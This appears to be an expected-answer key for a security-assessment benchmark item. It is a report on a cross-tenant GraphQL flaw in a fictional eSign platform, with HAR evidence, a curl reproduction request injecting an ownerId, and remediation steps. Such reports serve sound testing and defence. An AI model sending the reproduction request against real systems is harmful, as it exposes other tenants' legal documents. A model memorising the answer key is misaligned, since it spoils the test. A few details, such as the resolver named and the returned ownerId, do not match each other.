# Expected Response

## System
- **Domain:** Document Signing / Legal Tech
- **System:** SignFlow eSign Platform
- **Example ID:** GQL-0197

## Priority Findings

### Finding 1: eSign Platform — Parameter Escalation via updateResource Extends Session Scope to Cross-Tenant Documents (Pattern 10.2)
**Severity:** High
**Category:** Single-User / Parameter Escalation / Own Session Scope Extension

**Summary:**
Per §4.0 (RISK-GQL-197): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 10.2 — parameter escalation/own session scope extension): the `updateResource` mutation accepts a client-supplied `ownerId` in its input, allowing a user to escalate their session scope beyond their own documents to those belonging to other tenants. An attacker from `tenant-a2c8` submitted `updateResource(id: "R-2197", input: {status: "approved", ownerId: "attacker-a2c89a21"})` against a signing document belonging to `tenant-9a21`, receiving `CONFIDENTIAL-a2c89a21`. In Document Signing, unauthorized access to or modification of legal documents constitutes contract fraud and compliance violation.

**Evidence from HAR:**
- Request: `POST https://api.signflow-esign-platf.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-a2c8`
- Mutation: `updateResource(id: "R-2197", input: {status: "approved", ownerId: "attacker-a2c89a21"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-9a21"`, `ownerId: "other-user-a2c89a21"`, `sensitiveField: "CONFIDENTIAL-a2c89a21"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-a2c89a21`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-197 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 10.2 | Parameter escalation, own session scope extension |
| HAR mutation | input.ownerId | attacker-a2c89a21 (client-injected) |
| HAR response | tenantId | tenant-9a21 returned to tenant-a2c8 |
| HAR response | sensitiveField | CONFIDENTIAL-a2c89a21 |
| HAR header | x-request-id | req-a2c89a21 |

## Steps to Reproduce

### Step 1 — updateResource parameter escalation cross-tenant eSign (HAR)
```bash
curl -s -X POST https://api.signflow-esign-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-a2c8" \
  -d '{"query": "mutation { updateResource(id: \"R-2197\", input: {status: \"approved\", ownerId: \"attacker-a2c89a21\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-9a21` signing document mutated, returns `CONFIDENTIAL-a2c89a21`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`; never allow session scope extension via input parameters.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
